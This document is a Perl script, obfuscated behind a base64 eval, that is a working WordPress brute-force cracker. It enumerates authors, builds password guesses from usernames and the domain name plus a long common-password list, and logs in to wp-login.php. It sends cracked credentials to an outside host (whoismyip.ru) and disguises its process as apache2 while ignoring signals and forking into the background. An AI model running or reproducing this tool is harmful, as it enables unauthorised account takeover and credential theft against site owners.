#!/usr/bin/perl
use MIME::Base64;
eval(decode_base64('use HTTP::Request;
use HTTP::Cookies;
use HTML::LinkExtor;
use LWP::UserAgent;
use LWP::Simple;
use IO::Socket::INET;
use Getopt::Long;
use constant ('TRUE', 1);
use constant ('FALSE', 0);
use constant ('HTTPTimeout', 8);
use constant ('USER_AGENT', 'Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15');
use constant ('MY_PROCNAME', '/usr/sbin/apache2');
my $Verbose = 0;
my $NoBrute = 0;
my $TimThumb = 0;
$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';
$0 = '/usr/sbin/apache2' . "\000" x 16;
my $pid = fork;
exit() if $pid;
die "\t\tProblema ao criar fork: $!" unless defined $pid;
@paths = ('', 'blog/', 'wordpress/', 'wp/');
@usernames_base = ('%site%', '%site8%', 'admin');
@usernames = '';
@passwords      = ('%site%',
                   '%site8%',
                   "%user%%user%",
                   "%user%1",
                   "%user%12",
                   "%user%123",
                   "%user%1234",
                   "%user%12345",
                   "%user%123456",
                   "%user%1980",
                   "%user%1981",
                   "%user%1982",
                   "%user%1983",
                   "%user%1984",
                   "%user%1985",
                   "%user%1986",
                   "%user%1987",
                   "%user%1988",
                   "%user%1989",
                   "%user%1990",
                   "%user%1991",
                   "%user%1992",
                   "%user%1993",
                   "%user%1994",
                   "%user%1995",
                   "%user%1996",
                   "%user%1997",
                   "%user%1998",
                   "%user%1999",
                   "%user%2000",
                   "%user%2001",
                   "%user%2002",
                   "%user%2003",
                   "%user%2004",
                   "%user%2005",
                   "%user%2006",
                   "%user%2007",
                   "%user%2008",
                   "%user%2009",
                   "%user%2010",
                   "%user%2011",
                   "%user%2012",
                   "%user%2013",
                   "%user%2014",
                   "%user%2015",
                   "%user%2016",
                   "%user%2017",
                   "%user%2018",
                   "%user%2019",
				   "%user%2020",
                   "%user8%",
                   "%user8%%user8%",
                   "12345",
                   "123456",
                   "admin",
                   "pass",
                   "password",
                   "test",
                   '!@#$%',
                   '%site8%',
                   '0000',
                   '000000',
                   '1%user%',
                   '1',
                   '102030',
                   '11111',
                   '111111',
                   '112233',
                   '12%user%',
                   '12',
                   '123%user%',
                   '123',
                   '123123',
                   '1234%user%',
                   '1234',
                   '12345',
                   '123456',
                   '1234567',
                   '12345678',
                   '123456789',
                   '1234567890',
                   '1234qwer',
                   '123mudar',
                   '123qwe',
                   '1q2w3e',
                   '1q2w3e4r',
                   '1q2w3e4r5t',
                   '1q2w3e4r5t6y',
                   '1qaz2wsx',
                   '1qaz@WSX',
                   '1qazXSW@',
                   '54321',
                   '654321',
                   '@dmin12',
                   '@dmin123',
                   'Admin1',
                   'Admin123',
                   'Admin1234',
                   'P455w0rd',
                   'P4SSW0RD',
                   'P4ssw0rd',
                   'P@55w0rd',
                   'P@SSW0RD',
                   'P@ssw0rd!',
                   'P@ssw0rd',
                   'P@ssw0rd1',
                   'P@ssword!',
                   'P@ssword',
                   'P@ssword1',
                   'P@ssword123',
                   'PASSWORD',
                   'PASSWORD123',
                   'Pa$$w0rd',
                   'Pa$$word',
                   'Pa55word',
                   'Pass123',
                   'Pass1234',
                   'Passw0rd!',
                   'Passw0rd',
                   'Password!',
                   'Password01',
                   'Password1',
                   'Password123',
                   'Password1234',
                   'Test123',
                   'abc123',
                   'abcd1234',
                   'admin',
                   'admin1',
                   'admin123',
                   'administrator',
                   'albert',
                   'asdfgh',
                   'asdfghj',
                   'asdfghjkl',
                   'changeme',
                   'contact123',
                   'demo123',
                   'letmein',
                   'loveme',
                   'newpass',
                   'p455w0rd',
                   'p4ssw0rd',
                   'p@55w0rd',
                   'p@ssw0rd',
                   'pass',
                   'pass123',
                   'passwd',
                   'password',
                   'password1',
                   'password123',
                   'q1w2e3',
                   'q1w2e3r4',
                   'q1w2e3r4t5',
                   'q1w2e3r4t5y6',
                   'qazwsx',
                   'qwe123',
                   'qweasd123',
                   'qwer1234',
                   'qwerty',
                   'qwerty123',
                   'qwertyuiop',
                   'root',
                   'root@123',
                   'test',
                   'test1',
                   'test123',
                   'web123',
                   'zxcvbn',
                   'zxcvbnm');
my $cookie_jar = 'HTTP::Cookies'->new;
my $sock = 'LWP::UserAgent'->new('timeout', 8);
$sock->agent('Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15');
$sock->cookie_jar($cookie_jar);
sub fErrorMsg () {
    print "\t[-] Error: " . $_[0] . "\n";
    exit;
}
sub HTTPGet () {
    my $url = $_[0];
    my $request = 'HTTP::Request'->new('GET', $url);
    my $response = $sock->request($request);
    return $response;
}
sub HTTPPost () {
    my $url = $_[0];
    my $h = 'HTTP::Headers'->new;
    $h->header('Accept', '*/*', 'Accept-Language', 'pt-br', 'Connection', 'Close', 'Pragma', 'no-cache');
    my $request = 'HTTP::Request'->new('POST', $url, $h);
    $request->content_type('application/x-www-form-urlencoded');
    $request->content($_[1]);
    my $response = $sock->simple_request($request);
    return $response;
}
sub IsWordPress () {
    my $url = $_[0];
    $url =~ s[http://][];
    my $new_url = 'http://' . $url . '/wp-login.php';
    my $r = &HTTPGet($new_url);
    if ($r->content =~ /action=lostpassword/) {
        return 1;
    }
    return 0;
}
sub ExtractLinks () {
    $parser = 'HTML::LinkExtor'->new;
    $parser->parse($_[0]);
    @links = $parser->links;
    @result = ();
    foreach $linkarray (@links) {
        my(@element) = @$linkarray;
        my $elt_type = shift @element;
        while (@element) {
            my($attr_name, $attr_value) = splice(@element, 0, 2);
            if ($attr_name eq 'href') {
                push @result, $attr_value;
            }
        }
    }
    return @result;
}
sub CheckPost () {
    $r = &HTTPGet('http://' . $_[0] . 'wp-admin/edit.php');
    unless ($r->is_success) {
        return 0;
    }
    if ($r->content =~ m[wp-admin/post.php\?]) {
        return 1;
    }
    return 0;
}
sub IsAdmin () {
    my $host = $_[0];
    my $path = $_[1];
    $r = &HTTPGet('http://' . $host . $path . 'wp-admin/theme-install.php');
    if ($r->is_success) {
        @l = &ExtractLinks($r->content);
        foreach $_ (@l) {
            if ($_ =~ /theme-install\.php\?tab=/) {
                return 1;
            }
        }
    }
    return 0;
}
sub WPLogin {
    my $host = $_[0];
    my $path = $_[1];
    my $user = $_[2];
    my $pass = $_[3];
    $PostData = 'log=' . $user . '&pwd=' . $pass . '&wp-submit=Login&redirect_to=http%3A%2F%2F' . $host . '%2F' . $path . '%2Fwp-admin%2F&testcookie=1' . "\r\n";
    $r = &HTTPPost('http://' . $host . $path . '/wp-login.php', $PostData);
    $ver = $r->as_string;
    if ($ver =~ /wordpress_logged_in/ and $ver =~ /path=/ and $ver =~ /302/) {
        if ($ver =~ m[Location:.*/wp-admin]) {
            return 1;
        }
        else {
            ();
        }
    }
    return 0;
}
sub InArray () {
    my($s, @a) = @_;
    foreach $_ (@a) {
        if ($s eq $_) {
            return 1;
        }
    }
    return 0;
}
sub GetSiteName () {
    $DomainName = $_[0];
    $c = $_[1];
    if ($c > 0) {
        return substr($DomainName, 0, $c);
    }
    return $DomainName;
}
sub EnumerateUsers () {
    my $url = $_[0];
    $url =~ s[http://][];
    @usernames = @usernames_base;
    $t = scalar @usernames;
    my $userid = 0;
    for ($i = 1; $i <= 10; ++$i) {
        $new_url = 'http://' . $url . '?author=' . $i;
        $r = &HTTPGet($new_url);
        if ($r->base =~ m[.*/author/(.*)/]) {
            $user = $1;
        }
        else {
            if ($r->content =~ /<body class=".*author\-(.*) author\-$i.*">/) {
                $user = $1;
            }
        }
        if (defined $user) {
            print "\t[+] User found: $user\n" if $Verbose;
            push @usernames, $user;
            if (scalar @usernames == 5 + $t) {
                return;
            }
            undef $user;
        }
    }
}
sub AddDataToFile () {
    $data = $_[0];
    getprint("http://whoismyip.ru/dist/ru2.php?save=$data");
}
GetOptions 'h=s', \$Host, 'o=s', \$OutputFile, 'w=s', \$wFile, 'l=i', \$LineNumber, 'v!', \$Verbose, 'n!', \$NoBrute, 't!', \$TimThumb;
$Host =~ s[http://][];
unless (defined $Host) {
    &fErrorMsg('You need to set the WordPress site with -h option.');
}
unless (defined $OutputFile) {
    &fErrorMsg('You need to set the output file with -o option');
}
if (defined $wFile) {
    open WFILE, $wFile;
    @passwords = ();
    foreach $p (<WFILE>) {
        chomp $p;
        push @passwords, $p;
    }
    close WFILE;
}
$Domain = $Host;
$Domain =~ s/www\.//;
$Domain =~ s/www2\.//;
$Domain =~ s/forum\.//;
$Domain =~ s/blog\.//;
$Domain =~ s/mail\.//;
@s = split(?\.?, $Domain, 0);
$DomainName = $s[0];
@s = split(?/?, $Host, 0);
$host = $s[0];
shift @s;

$base = '/' . join('/', @s);
unless ($NoBrute) {
    foreach $_ (@paths) {
        $path = $base . $_;
        unless (&IsWordPress($host . $path)) {
            print "\t[!] It does not appear to be WordPress : $host$path\n" if $Verbose;
            next;
        }
        print "\t[+] WordPress Found: $host$path\n" if $Verbose;
        &EnumerateUsers($host . $path);
        @_u = '';
        foreach $_ (@usernames) {
            $user = $_;
            while ($user =~ /%site(\d)*%/) {
                $c = $1;
                $s = &GetSiteName($DomainName, $c);
                $user =~ s/%site$c%/$s/;
            }
            if (&InArray($user, @_u)) {
                next;
            }
            push @_u, $user;

            @_p = '';

            $sing = $user;
            $sing =~ tr/aeio/4310/;

            push @passwords, $sing;

            $sing2 = $user;
            $sing2 =~ tr/aeio/@310/;

            push @passwords, $sing2;

            $sing3 = $user;
            $sing3 =~ tr/aeio/@3!0/;

            push @passwords, $sing3;

            $sing4 = $user;
            $sing4 =~ tr/aeios/43105/;

            push @passwords, $sing4;

            $sing5 = $user;
            $sing5 =~ tr/aeiost/431057/;

            push @passwords, $sing5;

            $sing6 = $user;
            $sing6 =~ tr/aei/431/;

            push @passwords, $sing6;

            $sing7 = $user;
            $sing7 =~ tr/ae/43/;

            push @passwords, $sing7;

            $sing8 = $user;
            $sing8 =~ tr/a/4/;

            push @passwords, $sing8;

            $sing9 = $user;
            $sing9 =~ tr/a/@/;

            push @passwords, $sing9;

            $sing10 = $user;
            $sing10 =~ tr/aeios/@3!0$/;

            push @passwords, $sing10;

            $sing11 = $user;
            $sing11 =~ tr/aeiostzb/43105728/;

            push @passwords, $sing11;

            $sing12 = $user;
            $sing12 = join " ", map {ucfirst} split " ", $sing12;

            push @passwords, $sing12;

            $sing13 = $user;
            $sing13 = join " ", map {ucfirst} split " ", $sing13;
            my $suf = "1";
            $sing13 .= $suf;

            push @passwords, $sing13;

            $sing14 = $user;
            $sing14 = join " ", map {ucfirst} split " ", $sing14;
            my $suf = "12";
            $sing14 .= $suf;

            push @passwords, $sing14;

            $sing15 = $user;
            $sing15 = join " ", map {ucfirst} split " ", $sing15;
            my $suf = "123";
            $sing15 .= $suf;

            push @passwords, $sing15;

            $sing16 = $user;
            $sing16 = join " ", map {ucfirst} split " ", $sing16;
            my $suf = "2018";
            $sing16 .= $suf;

            push @passwords, $sing16;

            $sing17 = $user;
            $sing17 = join " ", map {ucfirst} split " ", $sing17;
            my $suf = "2017";
            $sing17 .= $suf;

            push @passwords, $sing17;

            $sing18 = $user;
            $sing18 = join " ", map {ucfirst} split " ", $sing18;
            my $suf = "2016";
            $sing18 .= $suf;

            push @passwords, $sing18;

            $sing19 = $user;
            $sing19 = join " ", map {ucfirst} split " ", $sing19;
            my $suf = "2015";
            $sing19 .= $suf;

            push @passwords, $sing19;

            $sing20 = $user;
            $sing20 = join " ", map {ucfirst} split " ", $sing20;
            my $suf = "2014";
            $sing20 .= $suf;

            push @passwords, $sing20;

            $sing21 = $user;
            $sing21 = join " ", map {ucfirst} split " ", $sing21;
            my $suf = "2013";
            $sing21 .= $suf;

            push @passwords, $sing21;

            $sing22 = $user;
            $sing22 = join " ", map {ucfirst} split " ", $sing22;
            my $suf = "2012";
            $sing22 .= $suf;

            push @passwords, $sing22;

            $sing23 = $user;
            $sing23 = join " ", map {ucfirst} split " ", $sing23;
            my $suf = "2011";
            $sing23 .= $suf;

            push @passwords, $sing23;

            $sing24 = $user;
            $sing24 = join " ", map {ucfirst} split " ", $sing24;
            my $suf = "2010";
            $sing24 .= $suf;

            push @passwords, $sing24;

            $sing25 = $user;
            $sing25 =~ tr/aeio/4310/;
            $sing25 = join " ", map {ucfirst} split " ", $sing25;

            push @passwords, $sing25;

            $sing26 = reverse $user;

            push @passwords, $sing26;

            $sing27 = $user;
            $sing27 = join " ", map {ucfirst} split " ", $sing27;
            my $suf = "2019";
            $sing27 .= $suf;

            push @passwords, $sing27;
			
			$sing28 = $user;
            $sing28 = join " ", map {ucfirst} split " ", $sing28;
            my $suf = "2020";
            $sing28 .= $suf;

            push @passwords, $sing28;
			
			$sing29 = $user;
            $sing29 = join " ", map {ucfirst} split " ", $sing29;
            my $suf = "@123";
            $sing29 .= $suf;

            push @passwords, $sing29;

            foreach $_ (@passwords) {
                $pass = $_;
                while ($pass =~ /%site(\d)*%/) {
                    $c = $1;
                    $s = &GetSiteName($DomainName, $c);
                    $pass =~ s/%site$c%/$s/;
                }
                while ($pass =~ /%user(\d)*%/) {
                    $c = $1;
                    $s = &GetSiteName($user, $c);
                    $pass =~ s/%user$c%/$s/;
                }
                if (&InArray($pass, @_p)) {
                    next;
                }

                push @_p, $pass;

                print "\t\tTrying $host$path ${user}:$pass...\r\n" if $Verbose;
                $r = &WPLogin($host, $path, $user, $pass);
                if ($r) {
                    if (&IsAdmin($host, $path, $user, $pass)) {
                        &AddDataToFile('http://' . $host . $path . "wp-login.php:${user}:$pass");
                        print "\t[+] Cracked => ${user}:$pass in http://$host$path\n" if $Verbose;
                        exit 0;
                    }
                    else {
                        print "\t[--] Sorry, found => ${user}:$pass in http://$host$path with no admin permission\n" if $Verbose;
                        &AddDataToFile('http://' . $host . $path . "wp-login.php:${user}:$pass");
                        last;
                    }
                }
            }
        }
    }
}
print "[+] Done in $host!\r\n" if $Verbose;
exit $LineNumber;'));
